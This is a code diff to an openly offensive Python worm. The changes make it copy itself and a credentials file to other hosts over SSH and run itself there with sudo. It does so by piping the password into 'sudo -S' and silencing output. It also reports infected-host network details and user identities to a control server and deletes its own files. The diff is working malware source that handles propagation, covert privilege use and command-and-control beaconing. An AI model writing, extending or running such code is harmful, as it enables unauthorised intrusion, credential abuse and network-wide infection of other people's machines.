@@ -9,6 +9,7 @@ import netaddr
 import sys
 import subprocess
 import logging
+import os
 from scapy.all import *
 from pyngrok import ngrok
 from http.server import BaseHTTPRequestHandler, HTTPServer
@@ -17,9 +18,7 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 PROPAGATION
 """
 def propagate(host,port,username,password):
-	#TODO install as a python module
-
-	files = ["config.json","credentials.txt","worm","requirements.txt"]
+	files = ["config.json","credentials.txt","worm.py","requirements.txt"]
 	try:
 		ssh = paramiko.SSHClient()
 		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -28,11 +27,16 @@ def propagate(host,port,username,password):
 		scp.put(files,"~/")
 		scp.close()
 		
-		stdin,stdout,stderr = ssh.exec_command("sudo pip3 install -r requirements.txt; \
-							 sudo python3 worm.py")
+		command = "echo " + password + " | sudo -S apt install python3-pip -y > /dev/null 2>&1 ;" + \
+			  "sudo pip3 install -r ~/requirements.txt > /dev/null 2>&1 ;" + \
+			  "echo " + password + " | sudo -S python3 ~/worm.py > /dev/null 2>&1"
+		
+		channel = ssh.get_transport().open_session()
+		channel.exec_command(command)
+		channel.close()
 		
 		ssh.close()
-		return "spreaded in " + host
+		return "spreaded in " + host + " and executed itself on target machine. Wait for the message to give commands"
 	except:
 		ssh.close()
 		return "not possible to spread, are credentials right?"
@@ -145,12 +149,14 @@ SEND FEEDBACK TO CONTROL SERVER
 """
 def send_feedback(token,chat_id,host_ip,netmask,broadcast,gateway,code,devices_open_ports=None):
 	public_ip = requests.get("https://api.ipify.org").text
-	status = "Infected host and its network informations:\n" + \
+	status = "Infected host informations:\n" + \
 		 "host public ip: " + public_ip + "\n" + \
 		 "host private ip: " + host_ip + "\n" + \
 		 "netmask: " + netmask + "\n" + \
 		 "broadcast: " + broadcast + "\n" + \
 		 "gateway: " + gateway + "\n\n"
+		 
+	status += "effective user : " + os.environ["USER"] + "\n" + "sudo user : " + os.environ["SUDO_USER"] + "\n\n"
 	
 	if code == 1:
 		status += "Alone in the network!\n"
@@ -191,7 +197,7 @@ def determine_if():
 HTTP SERVER FUNCTIONALITIES
 """
 def delete():
-	command = ["rm","config.json","credentials.txt","README.md","worm.py","control_server.py","owned.txt","requirements.txt"]
+	command = ["rm","config.json","credentials.txt","worm.py","requirements.txt"]
 	process = subprocess.run(command,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
 	sys.exit()
 		
